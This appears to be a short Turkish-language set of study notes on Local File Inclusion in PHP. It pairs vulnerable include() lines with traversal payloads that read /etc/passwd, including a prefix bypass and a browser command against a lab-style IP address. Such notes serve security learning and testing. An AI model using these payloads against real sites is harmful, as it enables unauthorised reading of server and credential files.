# Local File Inclusion

## Basic Detection

Sitenin kaynak kodunda aşağıdaki gibi bir satır olsun:

```php title="Source Code"
include($_GET['language']);
```

Aşağıda verilen URL ile LFI zafiyeti test edilebilir:

```sh
my@attack:~$ firefox "http://94.237.60.154:50882/index.php?language=/etc/passwd"
```

## Path Traversal

Sitenin kaynak kodunda aşağıdaki gibi bir satır olsun:

```php title="Source Code"
include('./languages/' . $_GET['language']);
```

Bu durumda /etc/passwd yöntemi işe yaramaz.

Çünkü aşağıdaki dosya yolu talep edilir ve işlem başarısız olur:

* [ ] ./languages//etc/passwd

Bu gibi bir durumda aşağıda verilen ifade kullanılabilir:

* [x] ../../../etc/passwd

## Filename Prefix

Sitenin kaynak kodunda aşağıdaki gibi bir satır olsun:

```php title="Source Code"
include('lang_' . $_GET['language']);
```

Bu durumda ../../../etc/passwd yöntemi işe yaramaz.

Çünkü aşağıdaki dosya yolu talep edilir ve işlem başarısız olur:

* [ ] lang_../../../etc/passwd

Bu gibi bir durumda aşağıda verilen ifade kullanılabilir:

* [x] /../../../etc/passwd
